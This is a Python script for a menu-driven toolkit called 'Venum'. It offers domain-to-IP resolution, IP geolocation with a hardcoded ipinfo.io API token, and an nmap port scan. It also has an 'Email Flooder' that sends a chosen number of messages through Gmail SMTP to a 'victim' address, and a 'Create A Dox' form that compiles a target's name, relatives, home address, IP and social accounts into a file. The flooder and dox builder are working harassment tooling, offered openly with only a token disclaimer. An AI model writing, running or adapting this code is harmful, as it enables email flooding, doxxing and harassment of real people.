import os, time, socket, smtplib, pathlib, getpass
# built in ^
import requests, nmap, colorama
# non built in ^

colorama.init(autoreset=True)


def clear():
    os.system('cls||clear')


def dashes():
    print('-' * 50)


banner = colorama.Fore.LIGHTRED_EX + r'''
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣀⣀⣀⣀
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠙⣻⣷⣶⣤⣀
        ⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⡿⠋⠀⠀⠀⠀⢹⣿⣿⡟⠉⠉⠉⢻⡿
        ⠀⠀⠀⠀⠀⠀⠀⠰⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣿⣿⣇⠀⠀⠀⠈⠇
        ⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠉⠛⠿⣷⣤⡤
        ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣶⣦⣤⣤⣀⣀⣀⡀⠉
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
        ⠀⠀⠀⢀⣀⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠿⣿⣿⣿⣿⣿⣿⣦   Made with ❤️  by 0xMoham3d.
        ⠀⠀⣰⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣧
        ⠀⠀⣿⣿⣿⠁⠀⠈⠙⢿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿
        ⠀⠀⢿⣿⣿⣆⠀⠀⠀⠀⠈⠛⠿⣿⣶⣦⡤⠴⠀⠀⠀⠀⠀⣸⣿⣿⣿⡿
        ⠀⠀⠈⢿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⠃
        ⠀⠀⠀⠀⠙⢿⣿⣿⣿⣶⣦⣤⣀⣀⡀⠀⠀⠀⣀⣠⣴⣾⣿⣿⣿⡿⠃
        ⠀⠀⠀⠀⠀⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋
        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠙⠛⠛⠛⠛⠛⠛⠉⠁
''' + colorama.Style.RESET_ALL


def choices():
    clear()
    print(banner)
    menu = (
        colorama.Fore.LIGHTRED_EX + ' 1. Domain To IP\n' + colorama.Style.RESET_ALL +
        colorama.Fore.WHITE + ' 2. Reverse IP Lookup\n' + colorama.Style.RESET_ALL +
        colorama.Fore.LIGHTRED_EX + ' 3. Nmap Scan\n' + colorama.Style.RESET_ALL +
        colorama.Fore.WHITE + ' 4. Email Flooder\n' + colorama.Style.RESET_ALL +
        colorama.Fore.LIGHTRED_EX + ' 5. Create A Dox\n' + colorama.Style.RESET_ALL +
        ' 0. Exit\n' +
        colorama.Fore.LIGHTRED_EX + '> ' + colorama.Style.RESET_ALL
    )

    while True:
        choice = input(menu)
        if choice == '1':
            dom2ip()
        elif choice == '2':
            ip_lookup()
        elif choice == '3':
            nmap_scan()
        elif choice == '4':
            flooder()
        elif choice == '5':
            dox()
        elif choice == '0':
            print('Exiting now, thank you for using Venum.')
            time.sleep(1)
            exit()
        else:
            clear()
            print('\nPlease choose a valid option: ')


def dom2ip():
    clear()
    domain = input('Enter a domain: ')
    
    try:
        ip = socket.gethostbyname(domain)
        print(f'{domain} --> {ip}')
    except socket.gaierror:
        print(f"Error: Could not resolve the domain {domain}")
    
    dashes()
    print('Domain To IP done, press enter to clear terminal & return')
    input()
    choices()


def ip_lookup():
    clear()
    ip = input('Enter an IP address: ')
    url = f'https://ipinfo.io/{ip}/json?token=96e536f06e898f'

    try:
        res = requests.get(url)
        res.raise_for_status()
        data = res.json()
# ---------------------------------------------------------
        print(f"{'IP Address':25}{data.get('ip', 'N/A')}")
        print(f"{'Country':25}{data.get('country', 'N/A')} [{data.get('country', 'N/A')}]")
        print(f"{'Region':25}{data.get('region', 'N/A')}")
        print(f"{'City':25}{data.get('city', 'N/A')}")
        print(f"{'Coordinates of City':25}{data.get('loc', 'N/A')}")
        print(f"{'ISP':25}{data.get('org', 'N/A')}")
        print(f"{'Timezone':25}{data.get('timezone', 'N/A')}")
# ---------------------------------------------------------
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
    
    dashes()
    print('Lookup complete. Press enter to return')
    input()
    choices()


def nmap_scan():
    clear()
    ip = input('Enter IP to perform nmap scan on: ')
# ---------------------------------------------------------
    try:
        scanner = nmap.PortScanner()
        scanner.scan(ip)
        
        if ip in scanner.all_hosts():
            print(f'Host: {ip} ({scanner[ip].hostname()})')
            print(f'State: {scanner[ip].state()}')

            for proto in scanner[ip].all_protocols():
                print(f'\nProtocol: {proto}')
                ports = scanner[ip][proto].keys()
                for port in sorted(ports):
                    state = scanner[ip][proto][port]['state']
                    print(f'Port {port}: {state}')
        else:
            print(f'No scan results for {ip}')
# ---------------------------------------------------------
    except nmap.PortScannerError as e:
        print(f"Error with nmap scan: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

    dashes()
    print('Nmap scan complete. Press enter to return')
    input()
    choices()


def flooder():
    clear()
    email = input('Enter your email: ')
    victim_email = input('Enter the victim\'s email: ')
    subject = input('Enter the email subject: ')
    message = input('Enter your message: ')
    count = int(input('Enter the number of emails you want to send: '))
# ---------------------------------------------------------
    app_pwd = input('Enter your app password (For more info: https://bestsoftware.medium.com/how-to-create-an-app-password-on-gmail-e00eff3af4e0): ')
    full_message = (f'Subject: {subject}\n\n{message}')
# ---------------------------------------------------------
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, app_pwd)
        
        for i in range(count):
            server.sendmail(email, victim_email, full_message)
        
        dashes()
        print(f'Email(s) have been sent to {victim_email} successfully. Press enter to clear & return')
# ---------------------------------------------------------
    except smtplib.SMTPAuthenticationError:
        print("Error: Authentication failed. Check your email or app password.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
    finally:
        server.quit()
# ---------------------------------------------------------
    input()
    choices()


def dox():
    clear()
    dox_file = []
    print("This specific tool was not made for harmful purpouses, so please don't use this for bad intentions.")
    time.sleep(3)
    clear()
    doxed_by = input('Doxed by: ')
    dox_file.append(f'[+] Doxed by {doxed_by}')
    doxed_for = input('Reason: ')
    dox_file.append(f'[+] Reason: {doxed_for}')
# ---------------------------------------------------------
    print('\nINFORMATIONS\n')
    dox_file.append('<================[ INFORMATIONS ]================>')
    name = input('Name: ')
    dox_file.append(f'[+] Name: {name}')
    pseudo = input('Pseudo: ')
    dox_file.append(f'[+] Pseudo: {pseudo}')
    surname = input('Surname: ')
    dox_file.append(f'[+] Surname: {surname}')
    mother = input('Mother: ')
    dox_file.append(f'[+] Mother: {mother}')
    father = input('Father: ')
    dox_file.append(f'[+] Father: {father}')
    brother = input('Brother: ')
    dox_file.append(f'[+] Brother: {brother}')
    sister = input('Sister: ')
    dox_file.append(f'[+] Sister: {sister}')
# ---------------------------------------------------------
    print('\nLOCATION INFO\n')
    dox_file.append('<================[ LOCATION ]================>')
    country = input('Country: ')
    dox_file.append(f'[+] Country: {country}')
    city = input('City: ')
    dox_file.append(f'[+] City: {city}')
    address = input('Address: ')
    dox_file.append(f'[+] Address: {address}')
    ip = input('IP: ')
    dox_file.append(f'[+] IP : {ip}')
# ---------------------------------------------------------
    print('\nSOCIAL INFO\n')
    dox_file.append('<================[ SOCIAL ]================>')
    tiktok = input('Tiktok: ')
    dox_file.append(f'[+] Tiktok: {tiktok}')
    instagram = input('Instagram: ')
    dox_file.append(f'[+] Instagram: {instagram}')
# ---------------------------------------------------------
    file_name = input('File name: ') or f'Doxed by {doxed_by}'

    script_dir = pathlib.Path(__file__).resolve().parent
    output_dir = script_dir / "output"
    user = getpass.getuser()
    desktop = pathlib.Path(f"C:/Users/{user}/Desktop")
    onedrive_desktop = pathlib.Path(f"C:/Users/{user}/OneDrive/Desktop")

    if output_dir.exists():
        save_path = output_dir / (file_name + ".txt")
    elif desktop.exists():
        save_path = desktop / (file_name + ".txt")
    elif onedrive_desktop.exists():
        save_path = onedrive_desktop / (file_name + ".txt")
    else:
        save_path = script_dir / (file_name + ".txt")

    with open(save_path, 'w', encoding='utf-8') as file:
        for i in dox_file:
            file.write(i + '\n')

    dashes()
    print('Saved to:', save_path, 'Press enter to clear & return')
    input()
    choices()


choices()